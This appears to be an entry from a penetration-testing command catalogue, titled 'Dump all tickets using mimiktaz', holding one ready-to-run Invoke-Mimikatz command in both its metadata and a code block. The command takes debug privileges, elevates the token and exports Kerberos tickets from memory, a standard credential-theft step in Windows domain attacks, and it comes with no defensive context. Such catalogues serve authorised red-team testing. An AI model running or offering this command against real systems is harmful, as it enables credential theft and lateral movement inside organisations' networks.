---
id: c581420b-ebe2-460e-9bb7-df69ff3d7b6f
name: Dump all tickets using mimiktaz
type: command
executor: bash
data: 'Invoke-Mimikatz -Command ''"privilege::debug" "token::elevate" "sekurlsa::tickets
  /export" "exit"''

  '
output: null
created_at: '2020-07-15T19:05:44.362600+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Dump all tickets using mimiktaz

```bash
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"'

```
